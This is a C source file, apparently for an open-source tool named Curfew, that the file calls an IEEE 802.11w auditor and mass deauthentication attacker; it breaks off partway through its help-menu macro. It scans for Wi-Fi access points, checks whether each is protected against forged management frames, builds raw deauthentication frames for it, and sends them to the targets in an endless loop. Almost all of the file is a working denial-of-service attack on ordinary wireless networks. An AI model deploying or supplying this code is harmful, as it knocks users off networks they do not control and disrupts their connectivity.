/*	MIT License
/
/	Copyright (c) 2017 - 2019, Ravjot Singh Samra (ravss@live.com)
/
/	Permission is hereby granted, free of charge, to any person obtaining
/	a copy of this software and associated documentation files
/	(the "Software"), to deal in the Software without restriction,
/	including without limitation the rights to use, copy, modify, merge,
/	publish, distribute, sublicense, and/or sell copies of the Software,
/	and to permit persons to whom the Software is furnished to do so,
/	subject to the following conditions:
/
/	The above copyright notice and this permission notice shall be
/	included in all copies or substantial portions of the Software.
/
/	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
/	EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
/	MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
/	IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
/	CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
/	TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
/	SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <errno.h>
#include <signal.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>
#include <ctype.h>
#include <linux/nl80211.h>
#include <net/if.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#define STAMAX 512
#define MONITOR "curfew0"

unsigned short exiting;
unsigned short verbose;

/* Note that this structure is created to only hold the first two octets
/  of the "RSN Capabilities" field's information, not both bytes. */
struct RSN
{
	/* Max Bytes: */
	/* 1 */
	unsigned char tag;
	/* 1 */
	/* Place to store the tag's length in. */
	unsigned char length;
	/* 2 */
	/* Double checks if we have actually found an RSN tag and
	/  not just a byte that is 0x30 with some supposed "length". */
	unsigned char version;
	/* 4 */
	/* Got to parse the entire packet to avoid
	/  PMK caching giving false RSN capability results. */
	unsigned char groupDataCipherSuite[4];
	/* 2 */
	unsigned char pairwiseCipherSuiteCount;
	/* 4 */
	/* Unused. */
	unsigned char pairwiseCipherSuiteList;
	/* 2 */
	unsigned char AKMcipherSuiteCount;
	/* 4 */
	/* Unused. */
	unsigned char AKMcipherSuiteList;
	/* 2 */
	/* First byte contains required or capable values for frame management
	/  protection. Ignore everything after this. */
	unsigned char capabilities;
	/* 2 */
	/* PMK caching seems to be only used in enterprise 802.11 APs? */
	unsigned char PMKIDcount;
	/* 16 */
	unsigned char PMKIDlist;
};

struct AP
{
	/* Essentially a variable for error-checking the parser. */
	short parsed;

	unsigned char *bssid;
	unsigned char *ssid;

	/* 802.11w-2009 support. */
	unsigned short MFPcapable;
	unsigned short MFPrequired;

	/* Storage for the access point's built deauthentication frame. */
	unsigned char *deauth;

	/* All packets should be the same length as addresses are 6 bytes,
	/  but this is kept just in case. */
	unsigned int deauthLen;

	/* The signal is stored as decibel-milliwatts (dBm) later on.
	/  The frequency remains stored as MHz. */
	int signal;
	unsigned int frequency;
};

struct PARAMETERS
{
	char *device;

	unsigned short scans;

	/* To be used for IOCTL methods of configuring devices as opposed to
	/  the new Netlink socket way. */
	unsigned short depreciatedMethods;

	unsigned short ceasefire;

	unsigned char *ignoreBssid;
	char *ignoreSsid;

	unsigned char *attackBssid;
	char *attackSsid;
	unsigned char *attackClient;

	/* TODO: Let the user choose a deauthentication reason. Currently
	/  set to "Unspecified Reason". */
	char *deauthReason;

	/* How many frames should be sent per focus on a target. */
	unsigned int burstRate;

	/* Currently unused.
	unsigned int attackDuration;
	unsigned short maxFound;
	*/
};

struct SCAN
{
	unsigned short found;
	struct AP *data;
	struct PARAMETERS *currentArgs;
};

struct scanResults
{
	int triggered;
	int results;
	int aborted;
};

struct handler_args
{
	const char *group;
	int id;
};

static int errorCallback(__attribute__((unused)) struct sockaddr_nl *nla,
	struct nlmsgerr *err, void *arg)
{
	int *ret;

	ret = arg;
	*ret = err->error;

	/* I have found that disabling sequencing does not always work,
	/  so this solves those odd cases. */
	if (*ret == -16) /* Ignore sequence number mismatches. */
		return NL_OK;

	printf("ERROR: Handler returned '%s' (%d).\n",
		nl_geterror(*ret), *ret);

	return NL_STOP;
}

static int triggerCallback(struct nl_msg *mesg, void *arg)
{
	struct genlmsghdr *hdr = nlmsg_data(nlmsg_hdr(mesg));
	struct scanResults *scanTriggers = arg;

	if (hdr->cmd == NL80211_CMD_SCAN_ABORTED)
	{
		scanTriggers->triggered = 1;
		scanTriggers->aborted = 1;
	}
	else if (hdr->cmd == NL80211_CMD_NEW_SCAN_RESULTS)
	{
		scanTriggers->triggered = 1;
		scanTriggers->results = 1;
	}

	return NL_SKIP;
}

void exitHandler(__attribute__((unused)) int signal)
{
	printf("\nINFO: Caught SIGINT, trying to exit Curfew...\n");

	if (!exiting) exiting = 1;
	else exiting += 1;

	if (exiting >= 10)
	{
		fprintf(stderr, "CRITICAL ERROR: More than %d SIGINTs "
			"received, emergency terminating.\n", exiting);
		exit(EXIT_FAILURE);
	}
}

/* TODO: Didn't study and rewrite this one, pasted it from the example and
/  formatted it slightly. Is it even needed? */
static int family_handler(struct nl_msg *msg, void *arg)
{
	/* Callback for NL_CB_VALID within nl_get_multicast_id().
	/  From http://sourcecodebrowser.com/iw/0.9.14/genl_8c.html. */
	struct handler_args *grp = arg;
	struct nlattr *tb[CTRL_ATTR_MAX + 1];
	struct genlmsghdr *gnlh = nlmsg_data(nlmsg_hdr(msg));
	struct nlattr *mcgrp;
	int rem_mcgrp;

	nla_parse(tb, CTRL_ATTR_MAX, genlmsg_attrdata(gnlh, 0),
		genlmsg_attrlen(gnlh, 0), NULL);

	if (!tb[CTRL_ATTR_MCAST_GROUPS]) return NL_SKIP;

	/* This is a loop. */
	nla_for_each_nested(mcgrp, tb[CTRL_ATTR_MCAST_GROUPS], rem_mcgrp)
	{
		struct nlattr *tb_mcgrp[CTRL_ATTR_MCAST_GRP_MAX + 1];

		nla_parse(tb_mcgrp, CTRL_ATTR_MCAST_GRP_MAX, nla_data(mcgrp),
			nla_len(mcgrp), NULL);

		if (!tb_mcgrp[CTRL_ATTR_MCAST_GRP_NAME]
			|| !tb_mcgrp[CTRL_ATTR_MCAST_GRP_ID]) continue;
		if (strncmp(nla_data(tb_mcgrp[CTRL_ATTR_MCAST_GRP_NAME]),
			grp->group,
			nla_len(tb_mcgrp[CTRL_ATTR_MCAST_GRP_NAME])))
			{
				continue;
			}

		grp->id = nla_get_u32(tb_mcgrp[CTRL_ATTR_MCAST_GRP_ID]);
		break;
	}

	return NL_SKIP;
}

/* TODO: Hardly rewrote this one either. Should be an easier way to find
/  the multicast packet that gets sent to the "scan" group which indicates
/  the results of the triggered scan. */
int nl_get_multicast_id(struct nl_sock *netlinkSocket,
	const char *family, const char *group)
{
	struct nl_msg *msg;
	int ret, driverControlID;
	struct handler_args grp = { .group = group, .id = -ENOENT, };

	msg = nlmsg_alloc();
	if (!msg) return -ENOMEM;

	driverControlID = genl_ctrl_resolve(netlinkSocket, "nlctrl");

	genlmsg_put(msg, 0, 0, driverControlID, 0, 0, CTRL_CMD_GETFAMILY, 0);

	ret = -ENOBUFS;
	nla_put_string(msg, CTRL_ATTR_FAMILY_NAME, family);

	ret = nl_send_auto_complete(netlinkSocket, msg);
	if (ret < 0) printf("ERROR: %d %s\n", ret, nl_geterror(ret));

	ret = 1;

	nl_socket_modify_cb(netlinkSocket, NL_CB_VALID,
		NL_CB_CUSTOM, family_handler, &grp);
	nl_socket_modify_err_cb(netlinkSocket, NL_CB_CUSTOM,
		errorCallback, &ret);

	while (ret != 0) ret = nl_recvmsgs_default(netlinkSocket);

	ret = grp.id;

	nlmsg_free(msg);
	return ret;
}

/* This function was taken from the first version of Curfew. Note that all
/  parsing is still the same, I may have done it wrong still. Seems to work. */
int parse80211w(unsigned char *data, unsigned int size)
{
	unsigned int i;
	short rsnPresent;
	/* Stop GCC from complaining about this non-issue specifically. */
	#pragma GCC diagnostic ignored "-Wmaybe-uninitialized"
		struct RSN rsn;
	#pragma GCC diagnostic pop

	rsnPresent = 0;

	for (i = 0; i < size; ++i)
	{
		if (data[i] == 0x30 && data[i + 2] == 0x01)
		{
			rsnPresent = 1;
			rsn.tag = data[i];

			/* This assumes all bytes that equal 0x30 or 48
			/  are RSN tags and therefore have the RSN length
			/  right after it. Not good; hence why
			/  the version byte check below. */
			rsn.length = data[i + 1];

			/* Only Version 1 exists, so this must always
			/  equal 0x01. Second byte is reserved/unused
			/  in RSN's standard, but add it anyway. */
			rsn.version = data[i + 2] + data[i + 3];

			/* Each byte does not add up, they are unique and
			/  "joined" together, hence why the array is needed.
			/  Ones below are not used, but parsed anyway. */
			rsn.groupDataCipherSuite[0] = data[i + 4];
			rsn.groupDataCipherSuite[1] = data[i + 5];
			rsn.groupDataCipherSuite[2] = data[i + 6];
			rsn.groupDataCipherSuite[3] = data[i + 7];

			rsn.pairwiseCipherSuiteCount = data[i + 8]
				+ data[i + 9];
			rsn.AKMcipherSuiteCount = data[i + 10
				+ (rsn.pairwiseCipherSuiteCount * 4)];

			/* There's just two bits that we are interested
			/  in for Management Frame Protection (MFP).
			/  Namely the "Capable" bit and the "Required" bit.
			/  This variable is used to store both. */
			rsn.capabilities = data[i + 16
				+ (rsn.AKMcipherSuiteCount * 4)];
		}
	}

	/* Check if RSN information element is present. */
	if (!rsnPresent)
		return 0;

	/* Convert the unsigned character variable
	/  (hex value) to an integer. */
	i = 0;
	i = strtoul((char *)&rsn.capabilities, NULL, 16);

	/* 1000000 = Capable, 0100000 = Required. For MFP to be required,
	/  it must also be capable; thus, "required" is actually 1100000. */
	if (i == 0)
		return 0; /* Vulnerable to deauthentication attacks. */
	else if (i >> 7 & 1 && i >> 6 & 1)
		return 11; /* Not vulnerable to deauthentication attacks. */
	else if (i >> 7 & 1)
		return 10; /* Depends on the client's preference/ability. */

	return 0;
}

/* TODO: While the frame builds successfully and works correctly, I should
/  probably correct some aspects of it (like the frequency). Unlike the
/  first version of Curfew, sending a packet now requires including the
/  RadioTap header. Needs a clean-up.*/
int buildAttackFrame(struct AP *data, unsigned short index,
	struct PARAMETERS *args)
{
	int i;
	static const unsigned char packet[34] =
		"\x00" /* RadioTap version. */
		"\x00" /* RadioTap header pad. */
		"\x08\x00" /* RadioTap header length. */
		"\x00\x00\x00\x00" /* RadioTap data (empty). */
		"\xc0" /* Type == 00. Subtype == 12. Frame control.*/
		"\x00" /* Flags. */
		"\x00\x00" /* Duration. */
		"\xff\xff\xff\xff\xff\xff" /* Destination (broadcast). */
		"\xe0\xb9\xe5\xb5\x8e\x8f" /* Source. */
		"\xe0\xb9\xe5\xb5\x8e\x8f" /* BSSID. */
		/* TODO: Don't be lazy and increment this when sending. */
		"\x00\x00" /* Fragment and sequence numbers. */
		/* TODO: Let the user pick the deauthentication reason. */
		"\x02\x00"; /* Deauthentication reason code. */

	/* Begins creating a new frame. */
	memcpy(data[index].deauth, packet, sizeof(packet));
	data[index].deauthLen = sizeof(packet);

	/* Lazy workaround for addresses containing "0" at first index. */
	if (memcmp(args->attackClient, "\00\00\00\00\00\00", 6))
	{
		for (i = 12; i < 18; ++i)
		{
			memcpy(data[index].deauth + i,
				&args->attackClient[i - 12],
				sizeof(unsigned char));
		}
	}

	/* TODO: In order to save some time during the attack loop, it would
	/  be much wiser to just exclude the ignored access points from even
	/  having their own deauthentication frames. */

	/* Must be 12 bytes to include all required addresses in frame. */
	memcpy(data[index].deauth + 18, data[index].bssid, 6);
	memcpy(data[index].deauth + 18 + 6, data[index].bssid, 6);

	return 1;
}

int parseSSID(unsigned char *storage, unsigned char *data, unsigned int size)
{
	unsigned int i, c, n;

	for (i = 0; i < size; ++i)
	{
		if (data[i] == 0 && data[i + 1] < 33 && data[i + 1] > 0)
		{
			n = 0;

			for (c = 0; c <= data[i + 1]; ++c)
			{
				if (isprint(data[i + 1 + c]))
					storage[n++] = data[i + 1 + c];
			}

			break;
		}
	}

	if (storage[0] == '\0')
		memcpy(storage, "NULL <Wildcard SSID>", 20 * sizeof(char));

	return 1;
}

int parseBSS(struct nl_msg *mesg, struct AP *data, int index)
{
	int i;
	struct genlmsghdr *hdr;
	struct nlattr *bss[NL80211_BSS_MAX + 1];
	struct nlattr *nest[NL80211_ATTR_MAX + 1];
	static struct nla_policy policy[NL80211_BSS_MAX + 1];

	hdr = nlmsg_data(nlmsg_hdr(mesg));
	policy[NL80211_BSS_FREQUENCY].type = NLA_U32;
	policy[NL80211_BSS_SIGNAL_MBM].type = NLA_U32;

	i = nla_parse(nest, NL80211_ATTR_MAX, genlmsg_attrdata(hdr, 0),
		genlmsg_attrlen(hdr, 0), NULL);

	if ((i < 0) || (!nest[NL80211_ATTR_BSS]))
	{
		printf("WARNING: Skipped unparsable result data "
			"'%s' (%d).\n", nl_geterror(i), i);
		return 0;
	}

	i = nla_parse_nested(bss, NL80211_BSS_MAX, nest[NL80211_ATTR_BSS],
		policy);

	/* I can either use "NL80211_BSS_INFORMATION_ELEMENTS" or I can use
	/  "NL80211_BSS_BEACON_IES". I do not think it impacts what we're
	/  trying to get out of the frame, as both should contain the RSN
	/  information element if it is in one of them? */
	if ((i < 0) || (!bss[NL80211_BSS_FREQUENCY]
		|| !bss[NL80211_BSS_INFORMATION_ELEMENTS]
		|| !bss[NL80211_BSS_BSSID]
		|| !bss[NL80211_BSS_SIGNAL_MBM]))
	{
		printf("WARNING: Skipped incomplete result data "
			"'%s' (%d).\n", nl_geterror(i), i);
		return 0;
	}

	/* Begin to check for duplication, in case we already have this
	/  data stored. */
	memcpy(data[index].bssid,
		nla_data(bss[NL80211_BSS_BSSID]), 6);

	if (index > 0) for (i = 0; i < index; ++i)
	{
		if (!memcmp(data[index].bssid, data[i].bssid, 6))
		{
			data[index].bssid[0] = '\0';
			return 0;
		}
	}

	/* Indicates that the access point is (going to be) parsed. */
	data[index].parsed = 1;

	parseSSID(data[index].ssid,
		nla_data(bss[NL80211_BSS_INFORMATION_ELEMENTS]),
		nla_len(bss[NL80211_BSS_INFORMATION_ELEMENTS]));

	i = parse80211w(nla_data(bss[NL80211_BSS_INFORMATION_ELEMENTS]),
		nla_len(bss[NL80211_BSS_INFORMATION_ELEMENTS]));

	data[index].MFPcapable = (i == 10 || i == 11) ? 1 : 0;
	data[index].MFPrequired = (i == 11) ? 1 : 0;

	data[index].frequency = nla_get_u32(bss[NL80211_BSS_FREQUENCY]);
	data[index].signal = nla_get_u32(bss[NL80211_BSS_SIGNAL_MBM]);
	data[index].signal /= 100; /* mBm to dBm. */

	return 1;
}

/* 'y' takes 6 hexadecimal numbers stored in 6 unsigned integers from
/  a single unsigned character string. */
#define printBSSID(x0, y, x1) printf(x0 "%02X:%02X:%02X:%02X:%02X:%02X" x1,\
	y[0], y[1], y[2], y[3], y[4], y[5])

int parserCallback(struct nl_msg *mesg, void *arg)
{
	struct SCAN *currentRun;

	currentRun = arg;

	if (!parseBSS(mesg, currentRun->data, currentRun->found))
		return NL_SKIP;

	if (!buildAttackFrame(currentRun->data, currentRun->found,
		currentRun->currentArgs))
		return NL_SKIP;

	printf("\t\tSSID:\t\t%s\n", currentRun->data[currentRun->found].ssid);

	printBSSID("\t\tBSSID:\t\t",
		currentRun->data[currentRun->found].bssid, "\n");

	printf("\t\tFrequency:\t%u MHz\n", currentRun->
		data[currentRun->found].frequency);

	printf("\t\tSignal:\t\t%d dBm\n", currentRun->
		data[currentRun->found].signal);

	if (currentRun->data[currentRun->found].MFPrequired)
		printf("\t\t802.11w-2009:\tRequired (Not Vulnerable)\n");
	else if (currentRun->data[currentRun->found].MFPcapable)
		printf("\t\t802.11w-2009:\tCapable (Client Dependant)\n");
	else printf("\t\t802.11w-2009:\tIncapable (Vulnerable)\n");

	puts("\t\t---------------------------------------");

	currentRun->found += 1;

	return NL_OK;
}

int triggerScan(struct PARAMETERS *args)
{
	int ret;
	int error;
	int deviceID, driverID, scanMulticastID;
	struct nl_sock *netlinkSocket;
	struct nl_msg *scan;
	struct nl_msg *scanList;
	struct scanResults scanTriggers;

	scanTriggers.triggered = 0;
	scanTriggers.results = 0;
	scanTriggers.aborted = 0;
	error = 0;

	netlinkSocket = nl_socket_alloc();
	genl_connect(netlinkSocket);
	scan = nlmsg_alloc();
	scanList = nlmsg_alloc();

	deviceID = if_nametoindex(args->device);
	driverID = genl_ctrl_resolve(netlinkSocket, "nl80211");

	scanMulticastID = nl_get_multicast_id(netlinkSocket, "nl80211",
		NL80211_MULTICAST_GROUP_SCAN);
	nl_socket_add_membership(netlinkSocket, scanMulticastID);

	genlmsg_put(scan, 0, 0, driverID, 0, NL80211_SCAN_FLAG_RANDOM_ADDR,
		NL80211_CMD_TRIGGER_SCAN, 0);
	nla_put_u32(scan, NL80211_ATTR_IFINDEX, deviceID);

	/* TODO: The scan list is unused for now, but adding it anyway. */
	nla_put(scanList, 1, 0, "");
	nla_put_nested(scan, NL80211_ATTR_SCAN_SSIDS, scanList);

	nl_socket_modify_cb(netlinkSocket, NL_CB_VALID, NL_CB_CUSTOM,
		triggerCallback, &scanTriggers);
	nl_socket_modify_err_cb(netlinkSocket, NL_CB_CUSTOM,
		errorCallback, &error);

	nl_socket_disable_seq_check(netlinkSocket);
	nl_socket_disable_auto_ack(netlinkSocket);

	ret = nl_send_auto(netlinkSocket, scan);

	if (ret < 0)
	{
		printf("ERROR: Scan failed to initiate - '%s' (%d)",
			nl_geterror(ret), ret);
		return -1;
	}

	while (!scanTriggers.triggered)
	{
		nl_recvmsgs_default(netlinkSocket);
		
		if (error && error != -16)
		{
			ret = -2;
			break;
		}
	}

	if (scanTriggers.aborted)
	{
		printf("ERROR: Scan was aborted.\n");
		ret = -1;
	}
	else if (scanTriggers.results)
	{
		printf("SUCCESS: Scan completed successfully.\n");
		ret = 0;
	}

	nlmsg_free(scan);
	nlmsg_free(scanList);
	nl_socket_drop_membership(netlinkSocket, scanMulticastID);
	nl_socket_free(netlinkSocket);

	return ret;
}

int getScan(struct SCAN *currentRun)
{
	int oldFound;
	int deviceID, driverID;
	struct nl_sock *netlinkSocket;
	struct nl_msg *result;

	netlinkSocket = nl_socket_alloc();
	genl_connect(netlinkSocket);
	result = nlmsg_alloc();

	deviceID = if_nametoindex(currentRun->currentArgs->device);
	driverID = genl_ctrl_resolve(netlinkSocket, "nl80211");

	genlmsg_put(result, 0, 0, driverID, 0, NLM_F_DUMP,
		NL80211_CMD_GET_SCAN, 0);
	nla_put_u32(result, NL80211_ATTR_IFINDEX, deviceID);

	nl_socket_modify_cb(netlinkSocket, NL_CB_VALID,
		NL_CB_CUSTOM, parserCallback, currentRun);

	nl_socket_disable_seq_check(netlinkSocket);
	nl_socket_disable_auto_ack(netlinkSocket);

	oldFound = currentRun->found;
	puts("\t\t---------------------------------------");

	/* TODO: Add some error-checking here. */
	nl_send_auto(netlinkSocket, result);
	nl_recvmsgs_default(netlinkSocket);

	if (currentRun->found == oldFound)
	{
		puts("\t\tZero new access points were discovered.\n"
			"\t\t---------------------------------------");
	}

	nlmsg_free(result);
	nl_socket_free(netlinkSocket);

	return 0;
}

/* Perhaps merge this with the `monitorInterface` management function? */
int setMonitor(char *device, unsigned short mode)
{
	int ret;
	int deviceID, driverID;
	int interfaceType;
	struct nl_sock *netlinkSocket;
	struct nl_msg *newInterface;
	enum nl80211_commands command;

	netlinkSocket= nl_socket_alloc();
	genl_connect(netlinkSocket);
	newInterface = nlmsg_alloc();

	command = NL80211_CMD_SET_INTERFACE;
	deviceID = if_nametoindex(device);
	driverID = genl_ctrl_resolve(netlinkSocket, "nl80211");

	genlmsg_put(newInterface, 0, 0, driverID, 0, 0, command, 0);

	nla_put_u32(newInterface, NL80211_ATTR_IFINDEX, deviceID);

	/* So far, I think only monitor mode and managed mode will be
	/  required. */
	interfaceType = (mode > 0)
		? NL80211_IFTYPE_MONITOR : NL80211_IFTYPE_STATION;

	nla_put_u32(newInterface, NL80211_ATTR_IFTYPE, interfaceType);

	nl_socket_disable_seq_check(netlinkSocket);

	ret = nl_send_auto_complete(netlinkSocket, newInterface);
	if (verbose) printf("setMonitor (%d) send: %d\n", mode, ret);

	ret = nl_recvmsgs_default(netlinkSocket);
	if (verbose) printf("setMonitor (%d) recv: %d '%s'\n",
		mode, ret, nl_geterror(ret));

	nlmsg_free(newInterface);
	nl_socket_free(netlinkSocket);

	return 1;
}

/* This is the preferred way of creating a new VIF for the attacking part.
/  I have had some wireless devices' firmware give me fatal kernel panics upon
/  legally creating a new VIF. No idea exactly why, probably poor drivers. */
int monitorInterface(char *device, char *name, int createInterface)
{
	int ret;
	int deviceID, driverID;
	struct nl_sock *netlinkSocket;
	struct nl_msg *manageInterface;
	enum nl80211_commands command;

	netlinkSocket= nl_socket_alloc();
	genl_connect(netlinkSocket);
	manageInterface = nlmsg_alloc();

	command = (createInterface)
		? NL80211_CMD_NEW_INTERFACE : NL80211_CMD_DEL_INTERFACE;
	deviceID = (createInterface)
		? if_nametoindex(device) : if_nametoindex(name);
	driverID = genl_ctrl_resolve(netlinkSocket, "nl80211");

	genlmsg_put(manageInterface, 0, 0, driverID, 0, 0, command, 0);

	nla_put_u32(manageInterface, NL80211_ATTR_IFINDEX, deviceID);

	if (createInterface)
	{
		nla_put_string(manageInterface, NL80211_ATTR_IFNAME, name);
		nla_put_u32(manageInterface, NL80211_ATTR_IFTYPE,
			NL80211_IFTYPE_MONITOR);
	}

	nl_socket_disable_seq_check(netlinkSocket);

	ret = nl_send_auto_complete(netlinkSocket, manageInterface);
	if (verbose) printf("monitorInterface (%d) send: %d\n",
		createInterface, ret);

	ret = nl_recvmsgs_default(netlinkSocket);
	if (verbose) printf("monitorInterface (%d) recv: %d '%s'\n",
		createInterface, ret, nl_geterror(ret));

	nlmsg_free(manageInterface);
	nl_socket_free(netlinkSocket);

	return 1;
}

int changeFrequency(char *device, unsigned int frequency)
{
	int ret;
	int deviceID, driverID;
	struct nl_sock *netlinkSocket;
	struct nl_msg *newFreq;
	enum nl80211_commands command;
	enum nl80211_chan_width channelWidth;

	netlinkSocket= nl_socket_alloc();
	genl_connect(netlinkSocket);
	newFreq = nlmsg_alloc();

	command = NL80211_CMD_SET_CHANNEL;
	/* TODO: Give options for the width. Set to safe default for now. */
	channelWidth = NL80211_CHAN_WIDTH_20_NOHT;
	deviceID = if_nametoindex(device);
	driverID = genl_ctrl_resolve(netlinkSocket, "nl80211");

	genlmsg_put(newFreq, 0, 0, driverID, 0, 0, command, 0);

	nla_put_u32(newFreq, NL80211_ATTR_IFINDEX, deviceID);
	nla_put_u32(newFreq, NL80211_ATTR_WIPHY_FREQ, frequency);
	nla_put_u32(newFreq, NL80211_ATTR_CHANNEL_WIDTH, channelWidth);

	nl_socket_disable_seq_check(netlinkSocket);

	ret = nl_send_auto_complete(netlinkSocket, newFreq);
	if (verbose) printf("changeFrequency send: %d\n", ret);

	ret = nl_recvmsgs_default(netlinkSocket);
	if (verbose) printf("changeFrequency recv: %d '%s'\n",
		ret, nl_geterror(ret));

	nlmsg_free(newFreq);
	nl_socket_free(netlinkSocket);

	return 1;
}

/* This is a depreciated method of switching to monitor mode for a device.
/  Unfortunately, some devices still don't play well with cfg80211 or mac80211,
/  and nl80211. `ifconfig` and `iwconfig` use the old IOCTL calls instead.
/  I could integrate it without using `system()`, but that is wasted time. */
int depreciated_setMonitor(char *device, int createInterface)
{
	char command[64 + 1];

	snprintf(command, 64, "ifconfig %s down", device);

	if (system(command) != 0)
		return -1;

	if (createInterface)
		snprintf(command, 64, "iwconfig %s mode monitor", device);
	else if (!createInterface)
		snprintf(command, 64, "iwconfig %s mode managed", device);

	if (system(command) != 0)
		return -2;

	snprintf(command, 64, "ifconfig %s up", device);

	if (system(command) != 0)
		return -3;

	return 1;
}

/* This slows down the attack loop if the burst rate is too small, as
/  switching to another channel/frequency takes more time. Again, this is for
/  devices which don't work with nl80211 and its kernel systems. */
int depreciated_changeFrequency(char *device, unsigned int frequency)
{
	char command[64 + 1];

	snprintf(command, 64, "iwconfig %s freq %uM", device, frequency);
	return system(command);
}

/* TODO: Currently this just creates regular raw sockets which then inject
/  the deauthentication packets into the 802.11 device that is
/  using RadioTap. For even higher speeds, I believe PF_RING can be used.
/  That, or I can use PACKET_TX_RING as well for a likely improvement. */
unsigned int createRawSocket(char *device)
{
	int rawSocket;
	struct sockaddr_ll rawSockAddr;

	rawSocket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	memset(&rawSockAddr, 0, sizeof(rawSockAddr));

	rawSockAddr.sll_family = AF_PACKET;
	rawSockAddr.sll_ifindex = if_nametoindex(device);
	rawSockAddr.sll_protocol = htons(ETH_P_ALL);

	if (bind(rawSocket, (struct sockaddr*) &rawSockAddr,
		sizeof(rawSockAddr)) < 0)
	{
		fprintf(stderr, "CRITICAL ERROR: Unable to "
			"bind raw socket.\n");
		return 0;
	}
	else return rawSocket;
}

#define snprintBSSID(x, y) snprintf(x, 13, "%02X%02X%02X%02X%02X%02X",\
	y[0], y[1], y[2], y[3], y[4], y[5])

/* Not sure if this would be better overall in a macro or a function. */
/* TODO: As of 2.00, it's possible to specify two things to attack
/  or ignore (BSSID and SSID), but BSSID has precedence and
/  receives priority. Tell this to the user or check if both are
/  included so both can be compared. */
int commander(struct SCAN *currentRun, unsigned int currentTarget)
{
	char currentAddress[13 + 1];
	char parameterAddress[13 + 1];

	if (currentRun->currentArgs->ignoreBssid[0] != '\0')
	{
		/* TODO: This is done to "normalise" the hex values, GDB has
		/  shown that sometimes (even with the exact same addresses)
		/  the unsigned characters are completely different. This needs
		/  to be done outside of this function to save performance,
		/  but I believe it only affects the access point's BSSID
		/  that was retrieved via `nla_data`. */
		snprintBSSID(currentAddress,
			currentRun->data[currentTarget].bssid);
		snprintBSSID(parameterAddress,
			currentRun->currentArgs->ignoreBssid);

		/* `memcmp` is apparently faster than `str(n)cmp`. */
		if (!memcmp(currentAddress, parameterAddress, 6))
			return 0;
		else return 1;
	}

	if (currentRun->currentArgs->ignoreSsid[0] != '\0')
	{
		if (!memcmp(currentRun->data[currentTarget].ssid,
			currentRun->currentArgs->ignoreSsid, 32))
			return 0;
		else return 1;
	}

	if (currentRun->currentArgs->attackBssid[0] != '\0')
	{
		snprintBSSID(currentAddress,
			currentRun->data[currentTarget].bssid);
		snprintBSSID(parameterAddress,
			currentRun->currentArgs->attackBssid);

		if (!memcmp(currentAddress, parameterAddress, 6))
			return 1;
		else return 0;
	}

	if (currentRun->currentArgs->attackSsid[0] != '\0')
	{
		if (!memcmp(currentRun->data[currentTarget].ssid,
			currentRun->currentArgs->attackSsid, 32))
			return 1;
		else return 0;
	}

	return 1;
}

int sendAttackFrames(struct SCAN *currentRun, unsigned int rawSocket)
{
	unsigned int i, b;
	int ret;

	attack: for (i = 0; i < currentRun->found; ++i)
	{
		/* TODO: It's possible to speed up the attack loop by removing
		/  checks and things to exclude if there are no exclusions
		/  in the first place; thus, ignoring this next function. */
		if (!commander(currentRun, i))
			continue;

		if (!currentRun->currentArgs->depreciatedMethods)
		{
			changeFrequency(currentRun->currentArgs->device,
				currentRun->data[i].frequency);
		}
		else
		{
			depreciated_changeFrequency(currentRun->
				currentArgs->device, currentRun->
				data[i].frequency);
		}

		for (b = 0; b < currentRun->currentArgs->burstRate; ++b)
		{
			ret = write(rawSocket, currentRun->data[i].deauth,
				currentRun->data[i].deauthLen);

			if (ret < 0)
			{
				fprintf(stderr, "CRITICAL ERROR: Sending "
					"frame failed - '%s' (%d).\n",
					strerror(errno), errno);
				return 0;
			}

			if (exiting) return 1;
		}
	}

	if (!exiting) goto attack;

	return 1;
}

/* This function manages the structure that contains the details for
/  the current scan and/or attack. I decided to allocate it all at once instead
/  of doing it more dynamically for the sake of speed at the cost of memory. */
void manageScanMemory(struct SCAN *scan, int allocate)
{
	int i;

	if (allocate)
	{
		scan->found = 0;
		scan->data = malloc(sizeof(struct AP) * STAMAX);

		for (i = 0; i < STAMAX; ++i)
		{
			scan->data[i].bssid =
				calloc(6 + 1, sizeof(scan->data[i].bssid));
			scan->data[i].ssid =
				calloc(32 + 1, sizeof(scan->data[i].ssid));
			scan->data[i].deauth =
				calloc(128, sizeof(scan->data[i].deauth));
		}

		scan->currentArgs = malloc(sizeof(struct PARAMETERS));
		scan->currentArgs->device = calloc(15 + 1,
			sizeof(scan->currentArgs->device));

		scan->currentArgs->ignoreBssid = calloc(6 + 1,
			sizeof(scan->currentArgs->ignoreBssid));
		scan->currentArgs->ignoreSsid = calloc(32 + 1,
			sizeof(scan->currentArgs->ignoreSsid));

		scan->currentArgs->attackBssid = calloc(6 + 1,
			sizeof(scan->currentArgs->attackBssid));
		scan->currentArgs->attackSsid = calloc(32 + 1,
			sizeof(scan->currentArgs->attackSsid));
		scan->currentArgs->attackClient = calloc(6 + 1,
			sizeof(scan->currentArgs->attackClient));

		scan->currentArgs->deauthReason = calloc(32 + 1,
			sizeof(scan->currentArgs->deauthReason));
	}
	else
	{
		for (i = 0; i < STAMAX; ++i)
		{
			free(scan->data[i].bssid);
			free(scan->data[i].ssid);
			free(scan->data[i].deauth);
		}

		free(scan->currentArgs->device);
		free(scan->currentArgs->ignoreBssid);
		free(scan->currentArgs->ignoreSsid);

		free(scan->currentArgs->attackBssid);
		free(scan->currentArgs->attackSsid);
		free(scan->currentArgs->attackClient);

		free(scan->currentArgs->deauthReason);

		free(scan->data);
		free(scan->currentArgs);
		free(scan);
	}
}

/* Let the compiler optimize non-format containing `printf()`s to `puts()`s. */
#define helpMenu do\
{\
	printf("PROGRAM:    Curfew\n");\
	printf("VERSION:    %s\n", VERSION);\
	printf("PURPOSE:    IEEE 802.11w auditing and mass deauthentication "\
		"attacker\n");\
